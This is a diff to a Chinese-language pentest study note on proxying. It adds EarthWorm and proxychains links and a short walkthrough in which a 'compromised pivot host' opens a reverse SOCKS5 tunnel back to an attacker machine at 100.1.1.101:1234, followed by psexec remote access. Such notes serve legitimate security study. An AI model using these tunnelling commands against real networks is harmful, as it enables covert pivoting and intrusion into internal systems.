@@ -13,7 +13,43 @@
 
 > [终于有人把正向代理和反向代理解释的明明白白了！-腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1418457)
 
-工具：**EarthWorm**
+> 工具：**EarthWorm**
+>
+> [idlefire/ew: 内网穿透(跨平台) (github.com)](https://github.com/idlefire/ew)
+>
+> proxychains_win
+>
+> [proxychains for windows 用法 - 下站见 (xiazhanjian.com)](https://www.xiazhanjian.com/archives/proxychainsforwindows.html)
+>
+> [EarthWorm(ew)使用教程 - FreeBuf网络安全行业门户](https://www.freebuf.com/sectool/259634.html)
+
+一次具体实施:
+
+1.在win10攻击机上运行：
+
+```
+ew_for_Win -s rcsocks -l 1080 -e 1234
+```
+
+添加一个转接隧道，把本地1080端口收到的代理请求转交给1234端口
+
+2.在攻陷的跳板机上：
+
+```
+ew_for_Win -s rssocks -d 100.1.1.101 -e 1234
+```
+
+跳板机上启动SOCKS5服务，并反弹到IP地址为100.1.1.101（攻击机）的1234端口上。
+
+3.攻击机启动proxychains：
+
+![image-20231219113111060](./assets/image-20231219113111060.png)
+
+使用psexec进行远程连接
+
+![image-20231219135236653](./assets/image-20231219135236653.png)
+
+
 
 代理与反向代理：
 
